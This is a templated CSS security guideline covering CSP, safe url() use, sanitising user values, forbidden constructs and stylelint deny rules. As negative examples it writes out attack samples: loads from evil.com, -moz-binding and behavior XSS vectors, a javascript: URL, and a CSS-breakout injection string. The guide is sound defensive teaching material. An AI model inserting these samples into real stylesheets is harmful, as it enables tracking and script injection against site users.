# Phase 6: Security

**Dependencies:** Phase 1 (Code Style)

**Can be implemented in parallel with:** Phase 4 (Testing), Phase 5 (Performance)

## Overview

Establish CSS security guidelines for `{{PROJECT_NAME}}`, covering Content Security Policy (CSP) compliance, avoiding unsafe `url()` patterns, sanitising user-provided values, and eliminating deprecated expression-like constructs.

---

## 6.1 Content Security Policy (CSP) Compliance

### CSP Basics for CSS

A Content Security Policy controls which CSS sources the browser will load and execute. CSS-related CSP directives:

```text
| Directive | Purpose | Recommended Value |
|-----------|---------|-------------------|
| style-src | Controls CSS sources | 'self' (+ nonce for inline) |
| font-src | Controls font sources | 'self' |
| img-src | Controls image sources (used in url()) | 'self' data: |
```

### CSP-Compliant CSS Practices

```text
| Practice | CSP-Safe | CSP-Unsafe |
|----------|----------|------------|
| External stylesheets | ✓ <link rel="stylesheet"> | — |
| Inline <style> with nonce | ✓ <style nonce="abc"> | ✗ <style> (without nonce) |
| style attribute | ✗ Requires 'unsafe-inline' | — |
| @import from same origin | ✓ @import "./file.css" | ✗ @import "http://evil.com" |
| url() from same origin | ✓ url(/images/bg.png) | ✗ url(http://tracker.com/px) |
```

### Inline Styles and CSP

```html
<!-- ✓ CSP-safe: use nonce for inline styles -->
<style nonce="{{NONCE}}">
  .card { background: var(--color-surface); }
</style>

<!-- ✗ CSP-unsafe: style attribute requires 'unsafe-inline' -->
<div style="color: red;">Avoid this</div>

<!-- ✓ CSP-safe alternative: use classes or custom properties -->
<div class="text-error">Use this instead</div>
```

### CSP Header Example

```text
Content-Security-Policy:
  default-src 'self';
  style-src 'self' 'nonce-{{NONCE}}';
  font-src 'self';
  img-src 'self' data:;
```

## 6.2 Safe url() Usage

### Rules for url() in CSS

```text
| Pattern | Safe? | Risk | Alternative |
|---------|-------|------|-------------|
| url(/images/icon.svg) | ✓ | None | — |
| url(./relative/path.png) | ✓ | None | — |
| url(https://cdn.example.com/img.png) | ⚠ | Third-party tracking | Self-host if possible |
| url(data:image/svg+xml,...) | ⚠ | Inline data, CSP issues | Use external SVG file |
| url(data:image/png;base64,...) | ⚠ | Large payloads, CSP issues | Use external PNG file |
| url(javascript:...) | ✗ | XSS vector | Never use |
| url(//evil.com/tracker.gif) | ✗ | Tracking pixel | Never use |
```

### Data URI Policy

```css
/* ✗ AVOID: data URIs for images (bloats CSS, CSP complications) */
.icon {
  background: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0c...);
}

/* ✓ PREFERRED: external file reference */
.icon {
  background: url(/images/icon.svg);
}

/* ✓ ACCEPTABLE: very small inline SVGs (< 1KB) for critical icons */
.icon-check {
  background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>');
}
```

### Third-Party Resource Policy

```text
All external CSS resources (fonts, images, stylesheets) must:
  1. Be served from approved CDN domains listed in CSP
  2. Use HTTPS (never protocol-relative //)
  3. Include integrity hashes when available (SRI)
  4. Be self-hosted when possible to avoid third-party dependencies
```

```html
<!-- ✓ External stylesheet with SRI -->
<link rel="stylesheet"
  href="https://cdn.example.com/lib.css"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
```

## 6.3 Sanitising User-Provided Values

### Custom Properties from User Input

When custom properties are set from user input (e.g., theme customisation), they must be sanitised:

```css
/* DANGER: user-provided custom property value could contain url() or expressions */
.user-themed {
  background: var(--user-bg-color);
  /* If --user-bg-color = "url(//evil.com/track)" this is a security risk */
}
```

### Sanitisation Rules

```text
| Input Type | Validation | Example |
|------------|-----------|---------|
| Colour | Match hex/rgb/hsl/oklch pattern only | #ff0000, oklch(50% 0.2 265) |
| Number | Numeric only, within range | 0-100 for opacity |
| Length | Numeric + allowed units only | 16px, 1rem, 2em |
| String | Never allow in CSS values | — |
| URL | Allowlist of domains only | /images/*, cdn.example.com/* |
```

### Server-Side Sanitisation

```javascript
// Sanitise user colour input before setting as custom property
function sanitiseColour(input) {
  // Only allow hex, rgb, hsl, oklch patterns
  const hexPattern = /^#([0-9a-f]{3,8})$/i;
  const rgbPattern = /^rgba?\(\s*\d+\s*,\s*\d+\s*,\s*\d+/;
  const oklchPattern = /^oklch\(\s*[\d.]+%?\s+[\d.]+\s+[\d.]+/;

  if (hexPattern.test(input) || rgbPattern.test(input) || oklchPattern.test(input)) {
    return input;
  }
  return null; // Reject invalid input
}

// Set sanitised value
const colour = sanitiseColour(userInput);
if (colour) {
  element.style.setProperty('--user-color', colour);
}
```

### Client-Side Protection

```javascript
// Never inject unsanitised user input into CSS
// ✗ WRONG
element.style.cssText = `background: ${userInput}`;

// ✓ CORRECT: use setProperty with validated value
element.style.setProperty('--user-color', sanitisedValue);
```

## 6.4 Forbidden CSS Constructs

### Never Use These

```css
/* ✗ expression() — IE-only, executes JavaScript (XSS vector) */
.element { width: expression(document.body.clientWidth); }

/* ✗ -moz-binding — Firefox-only, loads XBL (XSS vector) */
.element { -moz-binding: url(evil.xml#xss); }

/* ✗ behavior — IE-only, loads HTC files (XSS vector) */
.element { behavior: url(evil.htc); }

/* ✗ @import from untrusted sources */
@import url(https://evil.com/inject.css);

/* ✗ javascript: pseudo-protocol in url() */
.element { background: url(javascript:alert(1)); }
```

### Stylelint Rules for Security

```json
{
  "rules": {
    "function-disallowed-list": ["expression"],
    "property-disallowed-list": ["-moz-binding", "behavior"],
    "function-url-scheme-disallowed-list": ["javascript", "data"],
    "no-unknown-custom-properties": null
  }
}
```

## 6.5 CSS Injection Prevention

### Risk: CSS Injection via User Content

If user-generated content includes class names or style attributes, it could be used for CSS injection:

```text
Attack vector: User provides a class name like:
  "; } body { display: none; } .x {

This could break out of a CSS context if improperly interpolated.
```

### Prevention

```text
| Vector | Prevention |
|--------|-----------|
| User-provided class names | Allowlist of valid class names |
| User-provided colours | Regex validation (hex/rgb/oklch only) |
| User-provided URLs | Allowlist of domains, no javascript: |
| Inline style attributes | Avoid; use class toggling instead |
| CSS custom properties from user input | Sanitise before setProperty() |
| Template interpolation into CSS | Never interpolate raw user input |
```

## 6.6 Security Review Checklist

```bash
# Find url() usage with external domains
rg "url\(.*https?://" {{STYLES_DIR}} --type css

# Find data URIs
rg "url\(.*data:" {{STYLES_DIR}} --type css

# Find any expression() usage (should be zero)
rg "expression\(" {{STYLES_DIR}} --type css

# Find any behavior/binding usage (should be zero)
rg "(behavior|moz-binding):" {{STYLES_DIR}} --type css

# Check for inline style attributes in HTML
rg "style=\"" --type html | head -20
```

---

## Checklist

- [ ] CSP policy defined with appropriate style-src directive
- [ ] All inline styles use nonce or are eliminated
- [ ] url() usage audited — no external trackers or untrusted domains
- [ ] Data URI policy established (prefer external files)
- [ ] Third-party resources use SRI hashes
- [ ] User-provided CSS values are sanitised (colours, lengths)
- [ ] Forbidden constructs documented (expression, behavior, -moz-binding)
- [ ] Stylelint rules configured to block forbidden functions/properties
- [ ] CSS injection prevention measures documented
- [ ] Security review commands documented and run regularly

## Verification

```bash
stylelint .
pnpm build

# Security-specific checks
rg "expression\(|behavior:|moz-binding:" {{STYLES_DIR}} --type css
rg "url\(.*javascript:" {{STYLES_DIR}} --type css
```

Security guidelines should be established early and enforced by stylelint rules in CI.
